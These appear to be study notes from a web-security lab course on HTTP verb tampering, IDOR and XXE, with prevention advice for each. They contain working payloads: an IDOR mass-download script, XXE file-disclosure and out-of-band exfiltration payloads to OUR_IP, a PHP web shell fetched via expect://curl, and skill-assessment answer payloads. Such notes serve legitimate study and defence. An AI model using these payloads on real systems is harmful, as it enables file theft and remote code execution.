* HTTP Verb Tampering
* Insecure Direct Object References
* XML External Entity Injection

# HTTP Verb Tampering
* HTTP protocol accepts various HTTP methods as `verbs` at beginning of a request
* occurs when web server has a misconfiguration of accepted HTTP methods
* http has [9 different verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)

**Insecure Configurations**
* insecure configurations cause first type of HTTP verb tampering vulns
* for example: web server's auth config may be limited to specific HTTP methods which would leave some HTTP methods accessible without authentication

**Insecure Coding**
* insecure coding causes the other type of HTTP verb tampering
* can occur when web developer applies specific filters to mitigate particular vulnerablities while not covering all HTTP methods
* For example: SQL sanitization that only happens on GET requests -> other methods might be used to bypass Sanitization

## Bypassing Basic Authentication
* relatively straightforward process
* We just need to try alternate HTTP methods to see how they are handled
* verb tampering because of insecure configurations are relatively easy to spot automatically
* In Burp: Right click on request and choose `Change Request Method`

### Bypassing Security Filters
* other and more common type is caused by Insecure Coding
* commonly found in security filters that detect malicious requests
* Sanitization or Input Validation might be tied to certain methods and could be circumvented by using other verbs

### Verb Tampering Prevention
* **Insecure Configuration**
	* not secure to limit authorization configuration to a specific HTTP verb
* **Insecure Coding**
	* harder to fix than config
	* need to find vulnerability in code first
	* Be consistent with the use of HTTP methods and ensure that same method is always used for any specific functionality across web app!
	* Examples:
		* PHP -> `$_REQUEST['param']`
		* Java -> `request.getParameter('param')`
		* C# -> `Request['param']`

# IDOR
* Insecure Direct Object Reference
* occur when a web app exposes a direct reference to an object which end user can directly control to obtain access to other similar objects
* Example: Download link references a file id: `download.php?file_id=123`
	* try other file id like 124 to get other file download you normally would not have access to
* IDOR vulnerabilities exist due to the lack of an access control on back-end 

### Identifying IDORs
* first step: identify IDOR vulnerability
* whenever we receive a specific resource: study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?uid=1)
* **AJAX Calls**
	* some web apps developed in JS frameworks may insecurely place all function call on front-end and use appropriate one based on user role
	* Example: if no admin account, only user functions would be used
		* However, we may still find admin functions if we look into front-end code
* **Understand Hashing/Encoding**
	* some web apps may not use simple sequential numbers as object references but may encode the reference or hash it instead
	* in case of base64: we can just decode it
	* in case of hashing: try to identify source that gets hashed and hash algorithm

## Mass IDOR Enumeration
* Static file IDOR:
	* most basic type of IDOR
	* files have recognizable, static and easy to predict patterns (like /documents/Invoice_1_09_2021.pdf or /documents/Report_1_10_2021.pdf)
* Mass Enumeration:
	* Use Burp Intruder or ZAP Fuzzer or bash script
	* Example Bash Script:
```bash
#!/bin/bash 
url="http://SERVER_IP:PORT" 

for i in {1..10}; do 
	for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do 
		wget -q $url/$link 
	done 
done
```

### Bypassing Encoded References
* often: IDs are not in plain text but instead encoded
* First: we need to find out how encoded
	* for example: base64 or md5
* Function Disclosure:
	* most modern web apps use application frameworks like Angular, React or Vue
	* sometimes web devs make the mistake of performing sensitive operations on client-side

### IDOR in Insecure APIs
* IDOR Information Disclosure Vulnerabilities allows us to read various types or resources
* IDOR Insecure Function Calls enable us to call APIs or execute functions as  another user
	* change parameters of function call to other user's functionality
* In Practice: often chain IDOR vulnerabilities
	* use information disclosure to get relevant information to exploit insecure function calls
	* We can then use these function calls to inject other paylaods like XSS 
### Prevention
* Object-Level Access Control
* Enforce user roles and permissions
	* map RBAC to all objects and resources
* Object Referencing
	* make sure that object references are unguessable
	* For example: generate random uids
* First: Implement strong access control system, then make them unguessable

# XXE (XML External Entitities)
* occur when XML data is taken from user-controlled input without properly sanitizing/safely parsing it
* allows to use XML features to perform malicious actions

### XML 
* Extensible Markup Language
* focused on storing/representing data instead of displaying
* Example document:
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<email> 
	<date>01-01-2022</date> 
	<time>10:00 am UTC</time> 
	<sender>john@inlanefreight.com</sender> 
	<recipients> 
		<to>HR@inlanefreight.com</to> 
		<cc> 
			<to>billing@inlanefreight.com</to> 
			<to>payslips@inlanefreight.com</to> 
		</cc> 
	</recipients> 
	<body> 
		Hello, Kindly share with me the invoice for the payment made on January 1, 2022.Regards, John 
	</body> 
</email>
```


| Key         | Definition                                                                                              | Example                                  |
| ----------- | ------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| Tag         | keys of an XML document, usally wrapped around < and > character                                        | `<date>`                                 |
| Entity      | XML variables, usually wrapped around & and ; characters                                                | `&lt;`                                   |
| Element     | root element or any of its child elements, and its value is stored in between the start-tag and end-tag | `<date>01-01-2022</date>`                |
| Attribute   | Optional specifciations for any element that are stored in the tags, which may be used by XML parser    | ``version="1.0"`/`encoding="UTF-8"``     |
| Declaration | usually first line of XML doc, defines the XML version and encoding to use when parsing                 | `<?xml version="1.0" encoding="UTF-8"?>` |
### XML DTD
* XML Document Type Definition
* allows validation of an XML doc against a pre-defined document structure
* Example:
```xml
<!DOCTYPE email [ 
	<!ELEMENT email (date, time, sender, recipients, body)> 
	<!ELEMENT recipients (to, cc?)> 
	<!ELEMENT cc (to*)> 
	<!ELEMENT date (#PCDATA)> 
	<!ELEMENT time (#PCDATA)> 
	<!ELEMENT sender (#PCDATA)> 
	<!ELEMENT to (#PCDATA)> 
	<!ELEMENT body (#PCDATA)> 
]>
```
* DTD is declaring the root email with ELEMENT type declaration and then denoting its child elements
* afterwards: each child element is declared
* DTD can be placed within XML document itself
* otherwise: can be stored in external file and then referenced within XML doc
	* also possible through URL

### XML Entitites
* may also defines custom entities in XML DTDs 
* can be done with the use of `ENTITY` keyword
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE email [ 
	<!ENTITY company "Inlane Freight"> 
]>
```
* once defined, it can be referenced in XML doc between `&` and `;`
* whenever entity is referenced, it will be replaced with with its value by XML parser
* We can reference External XML Entitites with the `SYSTEM` keyword which is followed by the external entity's path:
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "http://localhost/company.txt"> 
	<!ENTITY signature SYSTEM "file:///var/www/html/signature.txt"> 
]>
```

## Local File Disclosure
* when web app trusts unfiltered XML data, we may be able to disclose files on the back-end server
**Identify**:
* value of XML input is displayed in the response
* define an entity and reference it in the XML input
	* if displayed in response, we are able to define external entitites
Reading Sensitive File:
```xml
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "file:///etc/passwd"> 
]>
```
Other Options:
* ssh keys
* source code
* db configurations

XML Parser breaks, when referenced file includes characters like `<`, `>` etc. which have special meaning in XML context
Bypass for php:
```xml
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"> 
]>
```

### RCE with XXE
* easiest way: look for ssh keys
* we might be able to execute commands with PHP-based web apps through `PHP://expect` filter
	* needs to be installed and enabled
	* `expect://id` -> will execute id
	* most efficient way to turn XXE into RCE:
		* fetch web shell from our server and writing it to web app
```shellsession
lunims@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php 
lunims@htb[/htb]$ sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?> 
<!DOCTYPE email [   
	<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'"> 
]> 
<root> 
<name></name> 
<tel></tel> 
<email>&company;</email> 
<message></message> 
</root>
```

### Advanced File Disclosure
* **Advanced Exfiltration with CDATA**
	* for other apps than PHP based
	* to output data that does not conform to XML format, we can wrap content of external file with a CDATA tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`)
	* Use XML Parameter Entitites
		* special type of entitities that starts with a `%` character
```xml
<!ENTITY joined "%begin;%file;%end;">
```
* host it on our machine and reference it as external entity

```xml
<!DOCTYPE email [ 
	<!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag --> 
	<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file --> 
	<!ENTITY % end "]]>"> <!-- append the end of the CDATA tag --> 
	<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD --> 
	%xxe; 
]> 
... 
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

### Error-based XXE
* another situation: web app might not write any output -> blind to XML output
* First check for errors by sending malformed XML data like `<roo>` instead of `<root>`
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts"> 
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
* payload defines file parameter entity and then joins it with an entity that does not exist
	* web app would throw an error that the entity does not exist along with our joined `%file` as part of the error
```xml
<!DOCTYPE email [
	 <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
%remote; 
%error; 
]>
```
## Blind Data Exfiltration
* nothing printed out on web app (including errors)
* for such cases: `Out-of-band (OOB) Data Exfiltration`
* we will make the web app send a web request to our server with content of the file we are reading

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
Automatically decode it using php:
```php
<?php if(isset($_GET['content'])){ 
	error_log("\n\n" . base64_decode($_GET['content'])); 
	} 
?>
```
```shellsession
lunims@htb[/htb]$ vi index.php # here we write the above PHP code
lunims@htb[/htb]$ php -S 0.0.0.0:8000 

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```
Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
	%remote; 
	%oob; 
]> 
<root>&content;</root>
```

**Automated OOB Exfiltration**
* [XXEinjector](https://github.com/enjoiz/XXEinjector)
* copy HTTP request (e.g. from Burp) and write it to a file
* should not include the full XML data, only first line and then write `XXEInject`
```http
POST /blind/submitDetails.php HTTP/1.1 
Host: 10.129.201.94 
Content-Length: 169 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
Content-Type: text/plain;charset=UTF-8 
Accept: */* 
Origin: http://10.129.201.94 
Referer: http://10.129.201.94/blind/ 
Accept-Encoding: gzip, deflate 
Accept-Language: en-US,en;q=0.9 
Connection: close 

<?xml version="1.0" encoding="UTF-8"?> 
XXEINJECT
```

```shellsession
lunims@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
...
cat Logs/10.129.201.94/etc/passwd.log
```

## XXE Prevention
* avoid outdated components
	* XML is usually not handled manually by web developers but instead by built-in XML libraries
	* For example:  [libxml_disable_entity_loader](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) is deprecated
* Using safe XML configuration
	* disable referencing custom Document Type Definitions (DTDs)
	* Disable referencing External XML Entitites
	* Disable Parameter Entity processing
	* Disable support for XInclude
	* Prevent Reference Loops
* Ensure proper exception handling (so no XML error is displayed)


# Skill Assessment
Admin ID 52

GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test HTTP/1.1


<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> 
]>
            <root>
            <name>&company;</name>
            <details>456</details>
            <date>2026-04-13</date>
            </root>